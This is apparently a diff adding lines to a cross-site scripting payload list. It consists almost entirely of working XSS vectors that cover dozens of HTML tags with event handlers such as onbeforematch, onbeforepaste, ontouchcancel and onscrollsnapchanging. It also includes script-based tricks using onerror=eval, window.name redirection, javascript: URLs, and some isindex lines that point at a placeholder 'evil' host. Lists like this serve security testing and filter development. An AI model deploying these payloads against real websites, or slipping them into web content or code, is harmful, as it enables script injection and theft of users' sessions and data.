+<input3 onsecuritypolicyviolation=alert(1)>XSS</input3>
+<input3 ontouchcancel=alert(1)>XSS</input3>
+<input4 id=x onbeforematch=alert(1) hidden=until-found>
+<input4 onbeforepaste=alert(1)>XSS</input4>
+<input4 onsecuritypolicyviolation=alert(1)>XSS</input4>
+<input4 ontouchcancel=alert(1)>XSS</input4>
+<ins id=x onbeforematch=alert(1) hidden=until-found>
+<ins onbeforepaste=alert(1)>XSS</ins>
+<ins onsecuritypolicyviolation=alert(1)>XSS</ins>
+<ins ontouchcancel=alert(1)>XSS</ins>
+<isindex type=image src="//evil?
+<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?
+<kbd id=x onbeforematch=alert(1) hidden=until-found>
+<kbd onbeforepaste=alert(1)>XSS</kbd>
+<kbd onsecuritypolicyviolation=alert(1)>XSS</kbd>
+<kbd ontouchcancel=alert(1)>XSS</kbd>
+<keygen id=x onbeforematch=alert(1) hidden=until-found>
+<keygen onbeforepaste=alert(1)>XSS</keygen>
+<keygen onsecuritypolicyviolation=alert(1)>XSS</keygen>
+<keygen ontouchcancel=alert(1)>XSS</keygen>
+<label id=x onbeforematch=alert(1) hidden=until-found>
+<label onbeforepaste=alert(1)>XSS</label>
+<label onsecuritypolicyviolation=alert(1)>XSS</label>
+<label ontouchcancel=alert(1)>XSS</label>
+<legend id=x onbeforematch=alert(1) hidden=until-found>
+<legend onbeforepaste=alert(1)>XSS</legend>
+<legend onsecuritypolicyviolation=alert(1)>XSS</legend>
+<legend ontouchcancel=alert(1)>XSS</legend>
+<li id=x onbeforematch=alert(1) hidden=until-found>
+<li onbeforepaste=alert(1)>XSS</li>
+<li onsecuritypolicyviolation=alert(1)>XSS</li>
+<li ontouchcancel=alert(1)>XSS</li>
+<link href="xss.js" rel=stylesheet type="text/javascript">
+<link id=x onbeforematch=alert(1) hidden=until-found>
+<link onbeforepaste=alert(1)>XSS</link>
+<link onsecuritypolicyviolation=alert(1)>XSS</link>
+<link ontouchcancel=alert(1)>XSS</link>
+<link rel="canonical" accesskey="X" onclick="alert(1)" />
+<listing id=x onbeforematch=alert(1) hidden=until-found>
+<listing onbeforepaste=alert(1)>XSS</listing>
+<listing onsecuritypolicyviolation=alert(1)>XSS</listing>
+<listing ontouchcancel=alert(1)>XSS</listing>
+<main id=x onbeforematch=alert(1) hidden=until-found>
+<main onbeforepaste=alert(1)>XSS</main>
+<main onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></main>
+<main onsecuritypolicyviolation=alert(1)>XSS</main>
+<main ontouchcancel=alert(1)>XSS</main>
+<map id=x onbeforematch=alert(1) hidden=until-found>
+<map onbeforepaste=alert(1)>XSS</map>
+<map onsecuritypolicyviolation=alert(1)>XSS</map>
+<map ontouchcancel=alert(1)>XSS</map>
+<mark id=x onbeforematch=alert(1) hidden=until-found>
+<mark onbeforepaste=alert(1)>XSS</mark>
+<mark onsecuritypolicyviolation=alert(1)>XSS</mark>
+<mark ontouchcancel=alert(1)>XSS</mark>
+<marquee id=x onbeforematch=alert(1) hidden=until-found>
+<marquee onbeforepaste=alert(1)>XSS</marquee>
+<marquee onsecuritypolicyviolation=alert(1)>XSS</marquee>
+<marquee ontouchcancel=alert(1)>XSS</marquee>
+<math><x href="javascript:alert(1)">
+<menu id=x onbeforematch=alert(1) hidden=until-found>
+<menu onbeforepaste=alert(1)>XSS</menu>
+<menu onsecuritypolicyviolation=alert(1)>XSS</menu>
+<menu ontouchcancel=alert(1)>XSS</menu>
+<menuitem id=x onbeforematch=alert(1) hidden=until-found>
+<menuitem onbeforepaste=alert(1)>XSS</menuitem>
+<menuitem onsecuritypolicyviolation=alert(1)>XSS</menuitem>
+<menuitem ontouchcancel=alert(1)>XSS</menuitem>
+<meta id=x onbeforematch=alert(1) hidden=until-found>
+<meta onbeforepaste=alert(1)>XSS</meta>
+<meta onsecuritypolicyviolation=alert(1)>XSS</meta>
+<meta ontouchcancel=alert(1)>XSS</meta>
+<meter id=x onbeforematch=alert(1) hidden=until-found>
+<meter onbeforepaste=alert(1)>XSS</meter>
+<meter onsecuritypolicyviolation=alert(1)>XSS</meter>
+<meter ontouchcancel=alert(1)>XSS</meter>
+<multicol id=x onbeforematch=alert(1) hidden=until-found>
+<multicol onbeforepaste=alert(1)>XSS</multicol>
+<multicol onsecuritypolicyviolation=alert(1)>XSS</multicol>
+<multicol ontouchcancel=alert(1)>XSS</multicol>
+<nav id=x onbeforematch=alert(1) hidden=until-found>
+<nav onbeforepaste=alert(1)>XSS</nav>
+<nav onsecuritypolicyviolation=alert(1)>XSS</nav>
+<nav ontouchcancel=alert(1)>XSS</nav>
+<nextid id=x onbeforematch=alert(1) hidden=until-found>
+<nextid onbeforepaste=alert(1)>XSS</nextid>
+<nextid onsecuritypolicyviolation=alert(1)>XSS</nextid>
+<nextid ontouchcancel=alert(1)>XSS</nextid>
+<nobr id=x onbeforematch=alert(1) hidden=until-found>
+<nobr onbeforepaste=alert(1)>XSS</nobr>
+<nobr onsecuritypolicyviolation=alert(1)>XSS</nobr>
+<nobr ontouchcancel=alert(1)>XSS</nobr>
+<noembed id=x onbeforematch=alert(1) hidden=until-found>
+<noembed onbeforepaste=alert(1)>XSS</noembed>
+<noembed onsecuritypolicyviolation=alert(1)>XSS</noembed>
+<noembed ontouchcancel=alert(1)>XSS</noembed>
+<noframes id=x onbeforematch=alert(1) hidden=until-found>
+<noframes onbeforepaste=alert(1)>XSS</noframes>
+<noframes onsecuritypolicyviolation=alert(1)>XSS</noframes>
+<noframes ontouchcancel=alert(1)>XSS</noframes>
+<noscript id=x onbeforematch=alert(1) hidden=until-found>
+<noscript onbeforepaste=alert(1)>XSS</noscript>
+<noscript onsecuritypolicyviolation=alert(1)>XSS</noscript>
+<noscript ontouchcancel=alert(1)>XSS</noscript>
+<object data="# alert(1)" codebase=javascript://>
+<object data="#! alert(1)" codebase=javascript:>
+<object id=x onbeforematch=alert(1) hidden=until-found>
+<object onbeforepaste=alert(1)>XSS</object>
+<object onsecuritypolicyviolation=alert(1)>XSS</object>
+<object ontouchcancel=alert(1)>XSS</object>
+<ol id=x onbeforematch=alert(1) hidden=until-found>
+<ol onbeforepaste=alert(1)>XSS</ol>
+<ol onsecuritypolicyviolation=alert(1)>XSS</ol>
+<ol ontouchcancel=alert(1)>XSS</ol>
+<optgroup id=x onbeforematch=alert(1) hidden=until-found>
+<optgroup onbeforepaste=alert(1)>XSS</optgroup>
+<optgroup onsecuritypolicyviolation=alert(1)>XSS</optgroup>
+<optgroup ontouchcancel=alert(1)>XSS</optgroup>
+<option id=x onbeforematch=alert(1) hidden=until-found>
+<option onbeforepaste=alert(1)>XSS</option>
+<option onsecuritypolicyviolation=alert(1)>XSS</option>
+<option ontouchcancel=alert(1)>XSS</option>
+<output id=x onbeforematch=alert(1) hidden=until-found>
+<output onbeforepaste=alert(1)>XSS</output>
+<output onsecuritypolicyviolation=alert(1)>XSS</output>
+<output ontouchcancel=alert(1)>XSS</output>
+<p id=x onbeforematch=alert(1) hidden=until-found>
+<p onbeforepaste=alert(1)>XSS</p>
+<p onsecuritypolicyviolation=alert(1)>XSS</p>
+<p ontouchcancel=alert(1)>XSS</p>
+<param id=x onbeforematch=alert(1) hidden=until-found>
+<param onbeforepaste=alert(1)>XSS</param>
+<param onsecuritypolicyviolation=alert(1)>XSS</param>
+<param ontouchcancel=alert(1)>XSS</param>
+<picture id=x onbeforematch=alert(1) hidden=until-found>
+<picture onbeforepaste=alert(1)>XSS</picture>
+<picture onsecuritypolicyviolation=alert(1)>XSS</picture>
+<picture ontouchcancel=alert(1)>XSS</picture>
+<plaintext id=x onbeforematch=alert(1) hidden=until-found>
+<plaintext onbeforepaste=alert(1)>XSS</plaintext>
+<plaintext onsecuritypolicyviolation=alert(1)>XSS</plaintext>
+<plaintext ontouchcancel=alert(1)>XSS</plaintext>
+<pre id=x onbeforematch=alert(1) hidden=until-found>
+<pre onbeforepaste=alert(1)>XSS</pre>
+<pre onsecuritypolicyviolation=alert(1)>XSS</pre>
+<pre ontouchcancel=alert(1)>XSS</pre>
+<progress id=x onbeforematch=alert(1) hidden=until-found>
+<progress onbeforepaste=alert(1)>XSS</progress>
+<progress onsecuritypolicyviolation=alert(1)>XSS</progress>
+<progress ontouchcancel=alert(1)>XSS</progress>
+<q id=x onbeforematch=alert(1) hidden=until-found>
+<q onbeforepaste=alert(1)>XSS</q>
+<q onsecuritypolicyviolation=alert(1)>XSS</q>
+<q ontouchcancel=alert(1)>XSS</q>
+<rb id=x onbeforematch=alert(1) hidden=until-found>
+<rb onbeforepaste=alert(1)>XSS</rb>
+<rb onsecuritypolicyviolation=alert(1)>XSS</rb>
+<rb ontouchcancel=alert(1)>XSS</rb>
+<rp id=x onbeforematch=alert(1) hidden=until-found>
+<rp onbeforepaste=alert(1)>XSS</rp>
+<rp onsecuritypolicyviolation=alert(1)>XSS</rp>
+<rp ontouchcancel=alert(1)>XSS</rp>
+<rt id=x onbeforematch=alert(1) hidden=until-found>
+<rt onbeforepaste=alert(1)>XSS</rt>
+<rt onsecuritypolicyviolation=alert(1)>XSS</rt>
+<rt ontouchcancel=alert(1)>XSS</rt>
+<rtc id=x onbeforematch=alert(1) hidden=until-found>
+<rtc onbeforepaste=alert(1)>XSS</rtc>
+<rtc onsecuritypolicyviolation=alert(1)>XSS</rtc>
+<rtc ontouchcancel=alert(1)>XSS</rtc>
+<ruby id=x onbeforematch=alert(1) hidden=until-found>
+<ruby onbeforepaste=alert(1)>XSS</ruby>
+<ruby onsecuritypolicyviolation=alert(1)>XSS</ruby>
+<ruby ontouchcancel=alert(1)>XSS</ruby>
+<s id=x onbeforematch=alert(1) hidden=until-found>
+<s onbeforepaste=alert(1)>XSS</s>
+<s onsecuritypolicyviolation=alert(1)>XSS</s>
+<s ontouchcancel=alert(1)>XSS</s>
+<samp id=x onbeforematch=alert(1) hidden=until-found>
+<samp onbeforepaste=alert(1)>XSS</samp>
+<samp onsecuritypolicyviolation=alert(1)>XSS</samp>
+<samp ontouchcancel=alert(1)>XSS</samp>
+<script id=x onbeforematch=alert(1) hidden=until-found>
+<script onbeforepaste=alert(1)>XSS</script>
+<script onsecuritypolicyviolation=alert(1)>XSS</script>
+<script ontouchcancel=alert(1)>XSS</script>
+<script type="module">undef01.undef02();import "data:text/jscript,alert(1)"</script>
+<script> function window.onload(){ alert(1); } </script> <script> function window::onload(){ alert(1); } </script> <script> function window.location(){ } </script> <body> <script> function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){} </script> </body> <body> <script> function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; } </script> </body>
+<script>$(document).ready(function(){var inject="X";});function $(){return{ready:()=>0}};alert(1);</script>
+<script><img title="</script><img src onerror=alert(1)>"></script>
+<script>Function`X${location.hash.substr`1`}```</script>
+<script>eval(myUndefVar);var inject="X";var myUndefVar;alert(1);//</script>
+<script>location.protocol='javascript'</script>
+<script>location=name</script>
+<script>myUndefFunction(1);function myUndefFunction(){};alert(1);//</script>
+<script>navigation.navigate('javascript:alert(1)')</script>
+<script>new Function`X${location.hash.substr`1`}`</script>
+<script>ondevicemotion=setTimeout;Event.prototype.message='alert\x281\x29'</script>
+<script>ondeviceorientation=setTimeout;Event.prototype.name='alert\x281\x29'</script>
+<script>onerror=eval,new name</script>
+<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\x28alert\x281\x29\x29'</script>
+<script>onpageswap=setTimeout;location='x';Event.prototype.name='alert\x281\x29'</script>
+<script>onscroll=setTimeout;document.body.style.height='9999px';Event.prototype.name='alert\x281\x29'</script>
+<script>throw onerror=eval,'/*'+location</script>
+<script>throw onerror=eval,'alert\x281\x29'</script>
+<script>throw onerror=eval,name</script>
+<script>throw onerror=eval,x=new Error,x.message='alert\x281\x29',x</script>
+<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>
+<script>throw/x/,onerror=eval,h=location.hash,e=Error,e.message=h,e</script>
+<script>throw{},onerror=eval,h=location.hash,e={message:h},e</script>
+<script>undef01.undef02("X"+alert(1));function undef01(){}//</script>
+<script>undef01['undef02','X'+alert(1)];function undef01(){};//</script>
+<script>var x=atob("a");undef01.undef02();function atob(){alert(1);}</script>
+<script>var x=new y();function y(){};alert(1);//</script>
+<script>window.name='javascript:alert(1)';(""+new class b{toString=e=>location=name})</script>
+<script>window.name='javascript:alert(1)';</script><svg onload=location=name>
+<script>window.name='javascript:alert(1)';function a(){}(""+{a:location=name})</script>
+<section id=x onbeforematch=alert(1) hidden=until-found>
+<section onbeforepaste=alert(1)>XSS</section>
+<section onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></section>
+<section onsecuritypolicyviolation=alert(1)>XSS</section>
+<section ontouchcancel=alert(1)>XSS</section>
+<select id=x onbeforematch=alert(1) hidden=until-found>
+<select onbeforepaste=alert(1)>XSS</select>
+<select onsecuritypolicyviolation=alert(1)>XSS</select>
+<select ontouchcancel=alert(1)>XSS</select>
+<set id=x onbeforematch=alert(1) hidden=until-found>
+<set onbeforepaste=alert(1)>XSS</set>
+<set onsecuritypolicyviolation=alert(1)>XSS</set>
+<set ontouchcancel=alert(1)>XSS</set>
+<shadow id=x onbeforematch=alert(1) hidden=until-found>
+<shadow onbeforepaste=alert(1)>XSS</shadow>
+<shadow onsecuritypolicyviolation=alert(1)>XSS</shadow>
+<shadow ontouchcancel=alert(1)>XSS</shadow>
+<slot id=x onbeforematch=alert(1) hidden=until-found>
+<slot onbeforepaste=alert(1)>XSS</slot>
+<slot onsecuritypolicyviolation=alert(1)>XSS</slot>
+<slot ontouchcancel=alert(1)>XSS</slot>
+<small id=x onbeforematch=alert(1) hidden=until-found>
+<small onbeforepaste=alert(1)>XSS</small>
+<small onsecuritypolicyviolation=alert(1)>XSS</small>
+<small ontouchcancel=alert(1)>XSS</small>
+<source id=x onbeforematch=alert(1) hidden=until-found>
+<source onbeforepaste=alert(1)>XSS</source>
+<source onsecuritypolicyviolation=alert(1)>XSS</source>
+<source ontouchcancel=alert(1)>XSS</source>
+<spacer id=x onbeforematch=alert(1) hidden=until-found>
+<spacer onbeforepaste=alert(1)>XSS</spacer>
+<spacer onsecuritypolicyviolation=alert(1)>XSS</spacer>
+<spacer ontouchcancel=alert(1)>XSS</spacer>
+<span id=x onbeforematch=alert(1) hidden=until-found>
+<span onbeforepaste=alert(1)>XSS</span>
+<span onsecuritypolicyviolation=alert(1)>XSS</span>
+<span ontouchcancel=alert(1)>XSS</span>
+<strike id=x onbeforematch=alert(1) hidden=until-found>
+<strike onbeforepaste=alert(1)>XSS</strike>
+<strike onsecuritypolicyviolation=alert(1)>XSS</strike>
+<strike ontouchcancel=alert(1)>XSS</strike>
+<strong id=x onbeforematch=alert(1) hidden=until-found>
+<strong onbeforepaste=alert(1)>XSS</strong>
+<strong onsecuritypolicyviolation=alert(1)>XSS</strong>
+<strong ontouchcancel=alert(1)>XSS</strong>
+<style id=x onbeforematch=alert(1) hidden=until-found>
+<style onbeforepaste=alert(1)>XSS</style>
+<style onsecuritypolicyviolation=alert(1)>XSS</style>
+<style ontouchcancel=alert(1)>XSS</style>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <a class="scroll-item">Item 1</a><a class="scroll-item">Item 2</a></a>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <a2 class="scroll-item">Item 1</a2><a2 class="scroll-item">Item 2</a2></a2>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <abbr class="scroll-item">Item 1</abbr><abbr class="scroll-item">Item 2</abbr></abbr>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <acronym class="scroll-item">Item 1</acronym><acronym class="scroll-item">Item 2</acronym></acronym>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <address class="scroll-item">Item 1</address><address class="scroll-item">Item 2</address></address>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <animate class="scroll-item">Item 1</animate><animate class="scroll-item">Item 2</animate></animate>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <animatemotion class="scroll-item">Item 1</animatemotion><animatemotion class="scroll-item">Item 2</animatemotion></animatemotion>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <animatetransform class="scroll-item">Item 1</animatetransform><animatetransform class="scroll-item">Item 2</animatetransform></animatetransform>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <applet class="scroll-item">Item 1</applet><applet class="scroll-item">Item 2</applet></applet>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <area class="scroll-item">Item 1</area><area class="scroll-item">Item 2</area></area>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <article class="scroll-item">Item 1</article><article class="scroll-item">Item 2</article></article>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <aside class="scroll-item">Item 1</aside><aside class="scroll-item">Item 2</aside></aside>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <audio class="scroll-item">Item 1</audio><audio class="scroll-item">Item 2</audio></audio>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <audio2 class="scroll-item">Item 1</audio2><audio2 class="scroll-item">Item 2</audio2></audio2>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <b class="scroll-item">Item 1</b><b class="scroll-item">Item 2</b></b>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <bdi class="scroll-item">Item 1</bdi><bdi class="scroll-item">Item 2</bdi></bdi>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <bdo class="scroll-item">Item 1</bdo><bdo class="scroll-item">Item 2</bdo></bdo>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <big class="scroll-item">Item 1</big><big class="scroll-item">Item 2</big></big>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <blink class="scroll-item">Item 1</blink><blink class="scroll-item">Item 2</blink></blink>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <blockquote class="scroll-item">Item 1</blockquote><blockquote class="scroll-item">Item 2</blockquote></blockquote>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <body class="scroll-item">Item 1</body><body class="scroll-item">Item 2</body></body>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <br class="scroll-item">Item 1</br><br class="scroll-item">Item 2</br></br>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <button class="scroll-item">Item 1</button><button class="scroll-item">Item 2</button></button>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <canvas class="scroll-item">Item 1</canvas><canvas class="scroll-item">Item 2</canvas></canvas>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <caption class="scroll-item">Item 1</caption><caption class="scroll-item">Item 2</caption></caption>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <center class="scroll-item">Item 1</center><center class="scroll-item">Item 2</center></center>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <cite class="scroll-item">Item 1</cite><cite class="scroll-item">Item 2</cite></cite>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <code class="scroll-item">Item 1</code><code class="scroll-item">Item 2</code></code>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <col class="scroll-item">Item 1</col><col class="scroll-item">Item 2</col></col>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <colgroup class="scroll-item">Item 1</colgroup><colgroup class="scroll-item">Item 2</colgroup></colgroup>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <command class="scroll-item">Item 1</command><command class="scroll-item">Item 2</command></command>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <content class="scroll-item">Item 1</content><content class="scroll-item">Item 2</content></content>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <data class="scroll-item">Item 1</data><data class="scroll-item">Item 2</data></data>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <datalist class="scroll-item">Item 1</datalist><datalist class="scroll-item">Item 2</datalist></datalist>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <dd class="scroll-item">Item 1</dd><dd class="scroll-item">Item 2</dd></dd>
